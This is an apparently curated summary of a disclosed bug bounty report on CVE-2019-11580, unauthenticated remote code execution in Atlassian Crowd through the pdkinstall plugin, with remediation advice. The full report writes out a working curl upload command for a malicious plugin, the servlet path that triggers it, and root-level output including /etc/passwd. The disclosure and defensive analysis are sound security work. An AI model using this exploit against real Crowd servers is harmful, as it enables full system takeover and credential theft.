# Unauthenticated Remote Code Execution in Atlassian Crowd via PDKInstall Plugin (CVE-2019-11580)

## Metadata
- **Source:** HackerOne
- **Report:** 632721 | https://hackerone.com/reports/632721
- **Submitted:** 2019-06-30
- **Reporter:** cdl
- **Program:** Atlassian Bug Bounty / DoD Installation
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Arbitrary Plugin Installation, Remote Code Execution, Insecure Plugin Loading, Unauthenticated Access to Admin Functions
- **CVEs:** CVE-2019-11580
- **Category:** memory-binary

## Summary
Atlassian Crowd versions 2.1.0 through 3.4.x contain an unauthenticated remote code execution vulnerability due to the pdkinstall development plugin being incorrectly enabled in production release builds. An attacker can exploit this to upload and install arbitrary malicious plugins, achieving remote code execution with root privileges on vulnerable instances.

## Attack scenario
1. Attacker identifies an unpatched Atlassian Crowd instance exposed on the network (DoD environment)
2. Attacker crafts a malicious JAR plugin that executes arbitrary system commands
3. Attacker sends an unauthenticated HTTP POST request to /crowd/admin/uploadplugin.action with the malicious plugin as multipart form data
4. The pdkinstall plugin processes the upload without proper authentication validation and installs the malicious JAR
5. Attacker accesses the installed plugin via HTTP request (e.g., /crowd/plugins/servlet/[plugin-name]) to trigger code execution
6. Commands execute with root privileges, providing full system compromise and pivot point into NIPRNet and SSO-dependent applications

## Root cause
The pdkinstall development plugin was inadvertently left enabled in production release builds of Atlassian Crowd. The uploadplugin.action endpoint lacks proper authentication checks and allows unauthenticated users to upload arbitrary JAR files that are installed and executed as plugins with application privileges (root in this case).

## Attacker mindset
An attacker targeting a DoD installation would recognize Crowd as a high-value target due to its role as a centralized identity management and SSO solution. Compromising Crowd provides initial access, credential harvesting capabilities, and a pivot point to downstream applications trusting Crowd for authentication. The root execution context enables persistent backdoors and full infrastructure compromise.

## Defensive takeaways
- Immediately patch all Atlassian Crowd instances to versions 3.0.5, 3.1.6, 3.2.8, 3.3.5, 3.4.4 or later
- Remove development/debugging plugins from production release builds via code review and automated build verification processes
- Implement strict authentication and authorization checks on all admin-level endpoints, especially those involving file uploads or plugin installation
- Apply the principle of least privilege: run applications as non-root users to limit impact of code execution vulnerabilities
- Monitor identity management systems for unexpected plugin installations or modifications
- Disable or restrict access to admin endpoints at the network perimeter for defense-in-depth
- Implement file upload validation: verify plugin signatures, restrict file types, and scan for malicious payloads before installation

## Variant hunting
Check other Atlassian products (Jira, Bitbucket, Confluence) for similar plugin installation mechanisms with development artifacts left in builds
Search for other uploadplugin.action equivalents or /admin/ endpoints that accept file uploads without proper auth
Investigate other development plugins (pdkinstall, etc.) that may be unintentionally shipped in Atlassian release builds
Hunt for similar misconfigurations in other Java-based identity management systems (OpenAM, Keycloak, etc.)
Review historical Atlassian security advisories for patterns of development artifacts in production builds

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1592 - Gather Victim Identity Information (SSO target reconnaissance)
- T1199 - Trusted Relationship (Crowd's trusted position in authentication chain)
- T1557 - Man-in-the-Middle (potential for credential interception via compromised SSO)
- T1547 - Boot or Logon Initialization Scripts (persistence via plugin backdoor)
- T1543 - Create or Modify System Process (plugin execution as system service)

## Notes
This vulnerability is particularly severe in DoD environments due to the centralized nature of Crowd as an identity management system. The unauthenticated nature of the exploit combined with root execution represents a complete system compromise with minimal attacker requirements. The fact that no public PoC existed prior to this detailed writeup suggests the vulnerability may have been exploited in the wild without detection. The researcher successfully reverse-engineered the pdkinstall plugin to develop a working exploit, demonstrating the feasibility and criticality of the issue.

## Full report
<details><summary>Expand</summary>

**Summary:**
Atlassian Crowd is a centralized identity management application that allows companies to "Manage users from multiple directories - Active Directory, LDAP, OpenLDAP or Microsoft Azure AD - and control application authentication permissions in one single location."

A DOD installation is vulnerable to a remote code execution vulnerability due to not patching CVE-2019-11580.

**Description:**
From Atlassian's public [advisory](https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html):

> Crowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center.

There is no public proof-of-concept for this vulnerability, however, I spent a good amount of time reverse-engineering the "pdkinstall" plugin and I was able to successfully construct a working exploit.

## Step-by-step Reproduction Instructions

1. Download and unzip my malicious plugin: rce-plugin.zip {F519371}
2. `cd` into the directory
3. Run the following command:
```
curl -k -H "Content-Type: multipart/content" \
  --form "file_cdl=@rce.jar;type=application/octet-stream" https://███/crowd/admin/uploadplugin.action
```

You'll see that the malicious plugin is successfully installed:

```
Installed plugin /opt/atlassian/crowd/apache-tomcat/temp/plugindev-2906099909159442588rce.jar
```

Now visit https://███████/crowd/plugins/servlet/hackerone-cdl which invokes my malicious plugin. This executes the command `whoami` which is the user `root`

██████████

contents of `/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
████████x:6:0:██████████/sbin:/sbin/shutdown
██████x:7:0:███████/sbin:/sbin/halt
█████████x:8:12:█████/var/spool/████/sbin/nologin
███x:10:14:███/var/spool/███████/sbin/nologin
██████x:11:0:██████/root:/sbin/nologin
██████████x:12:100:███████/usr/████/sbin/nologin
██████████x:13:30:█████/var/█████/sbin/nologin
████x:14:50:FTP User:/var/███████/sbin/nologin
█████████x:99:99:Nobody:/:/sbin/nologin
██████████x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
██████████x:38:38::/etc/██████/sbin/nologin
██████████x:499:76:"Saslauthd user":/var/empty/██████████/sbin/nologin
██████████x:47:47::/var/spool/mqueue:/sbin/nologin
███████x:51:51::/var/spool/mqueue:/sbin/nologin
████████x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
█████x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
████████x:74:74:Privilege-separated SSH:/var/empty/████████/sbin/nologin
████████x:81:81:System message bus:/:/sbin/nologin
███████x:500:500:EC2 Default User:/home/████████/bin/bash
```

## Product, Version, and Configuration (If applicable)
```
Crowd or Crowd Data Center from version 2.1.0 before 3.0.5 (the fixed version for 3.0.x)
Crowd or Crowd Data Center from version 3.1.0 before 3.1.6 (the fixed version for 3.1.x)
Crowd or Crowd Data Center from version 3.2.0 before 3.2.8 (the fixed version for 3.2.x)
Crowd or Crowd Data Center from version 3.3.0 before 3.3.5 (the fixed version for 3.3.x)
Crowd or Crowd Data Center from version 3.4.0 before 3.4.4 (the fixed version for 3.4.x)
```

## Suggested Mitigation/Remediation Actions
I recommend updating to the latest version of Atlassian Crowd, but if that's not possible, follow mitigation options in the advisory.

## Impact

Remote code execution on https://███. An attacker could exploit this vulnerability to pivot into NIPRNet and gain access to other applications. Since Atlassian Crowd is an Identity management / Single Sign-on application, an attacker could exploit this vulnerability to gain access to any applications using Crowd for sign-ons. 


Since this is running as root, an attacker could also easily backdoor the login page and steal credentials.

Thanks,
Corben Leo (@cdl)

</details>

---
*Analysed by Claude on 2026-05-12*
